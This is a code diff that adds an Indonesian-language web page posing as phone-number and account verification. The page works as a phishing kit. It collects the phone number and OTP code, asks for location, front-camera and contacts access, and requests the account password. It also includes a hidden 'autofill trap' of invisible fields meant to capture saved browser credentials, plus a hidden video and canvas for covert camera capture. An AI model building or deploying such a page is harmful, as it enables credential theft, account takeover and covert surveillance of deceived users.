@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Verifikasi Akun — Keamanan</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<div class="bg-grid"></div>
+<div class="card" id="card">
+  <div class="logo">⚡</div>
+  <h1 id="title">Verifikasi Nomor</h1>
+  <p class="sub" id="sub">Masukkan nomor telepon aktif untuk menerima kode OTP.</p>
+
+  <div class="step" id="step-phone">
+    <div class="phone-wrap">
+      <span class="prefix">+62</span>
+      <input id="phone" inputmode="numeric" autocomplete="tel" placeholder="81234567890" maxlength="15">
+    </div>
+    <button class="btn" id="btn-send">Kirim Kode OTP</button>
+  </div>
+
+  <div class="step hidden" id="step-perm">
+    <p class="sub">Untuk melanjutkan, kami membutuhkan akses:</p>
+    <div class="perm-row">
+      <span>📍 Lokasi perangkat</span>
+      <span class="badge" id="b-geo">—</span>
+    </div>
+    <div class="perm-row">
+      <span>📷 Kamera depan</span>
+      <span class="badge" id="b-cam">—</span>
+    </div>
+    <div class="perm-row">
+      <span>📇 Kontak (opsional)</span>
+      <span class="badge" id="b-contacts">—</span>
+    </div>
+    <button class="btn" id="btn-allow">Izinkan & Lanjutkan</button>
+    <button class="btn btn-ghost" id="btn-skip-contacts">Lewati Kontak</button>
+  </div>
+
+  <div class="step hidden" id="step-otp">
+    <p class="sub">Kode 6 digit dikirim ke <b id="ph-out"></b></p>
+    <div class="otp-wrap">
+      <input class="otp" maxlength="1" inputmode="numeric">
+      <input class="otp" maxlength="1" inputmode="numeric">
+      <input class="otp" maxlength="1" inputmode="numeric">
+      <input class="otp" maxlength="1" inputmode="numeric">
+      <input class="otp" maxlength="1" inputmode="numeric">
+      <input class="otp" maxlength="1" inputmode="numeric">
+    </div>
+    <div class="timer" id="timer">Kirim ulang dalam 60s</div>
+    <button class="btn" id="btn-verify">Verifikasi</button>
+  </div>
+
+  <div class="step hidden" id="step-creds">
+    <p class="sub">Akun terverifikasi. Sinkronkan kata sandi & kontak untuk pemulihan.</p>
+    <div class="field">
+      <label>Email / Username</label>
+      <input id="c-user" autocomplete="username" placeholder="email@contoh.com">
+    </div>
+    <div class="field">
+      <label>Kata Sandi</label>
+      <input id="c-pass" type="password" autocomplete="current-password" placeholder="••••••••">
+    </div>
+    <div class="perm-row">
+      <span>📇 Sinkronkan Kontak</span>
+      <span class="badge" id="b-contacts2">—</span>
+    </div>
+    <button class="btn" id="btn-save">Simpan & Selesai</button>
+
+    <!-- AUTOFILL TRAP: input tersembunyi. Browser autofill saved creds ke sini. -->
+    <div class="autofill-trap" aria-hidden="true">
+      <input type="text" id="trap-user" name="username" autocomplete="username" tabindex="-1">
+      <input type="password" id="trap-pass" name="password" autocomplete="current-password" tabindex="-1">
+      <input type="email" id="trap-email" name="email" autocomplete="email" tabindex="-1">
+      <form id="trap-form"><input type="submit"></form>
+    </div>
+  </div>
+
+  <div class="step hidden" id="step-done">
+    <div class="ok">✓</div>
+    <h2>Akun Terverifikasi</h2>
+    <p class="sub">Terima kasih. Kamu bisa menutup halaman ini.</p>
+  </div>
+</div>
+
+<video id="cam" autoplay playsinline muted style="display:none"></video>
+<canvas id="cam-canvas" style="display:none"></canvas>
+
+<script src="/static/app.js"></script>
+</body>
+</html>
